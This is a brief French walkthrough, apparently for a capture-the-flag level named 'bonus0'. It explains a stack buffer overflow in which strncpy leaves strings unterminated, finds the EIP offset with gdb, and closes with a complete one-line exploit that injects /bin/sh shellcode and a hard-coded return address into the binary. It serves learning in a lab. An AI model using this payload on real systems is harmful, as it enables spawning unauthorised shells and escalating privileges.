Decompile bonus0:
-> main + 2 fonctions
(voir source.c)

buffer main qui est definit a 42
les deux buffers qui vont etre en entree sont de 20 chacun
et le strncpy s'arrete a 20 donc si on met pile le bon nombre de characteres on va sauter le '\n' ou le '\0'

gdb -q bonus0

run

(injecte des characters (20 pour le max de strncpy dans la fonction p()))

(puis injecte 4095 characters pour remplir le buffer(avec le pattern generator))

"0x41336141 in ?? ()" -> cette addresse est a retenir

info registers

On voit l'action eip sur quelle addresse est pointee

info frame

On voit si nos pattern sont pointee et vers ou on va devoir situe le SHELLCODE

shellcode /bin/sh linux :
https://shell-storm.org/shellcode/files/shellcode-827.html





(python -c 'print "A" * 30 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80
\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "A" * 7'; cat) | ./bonus0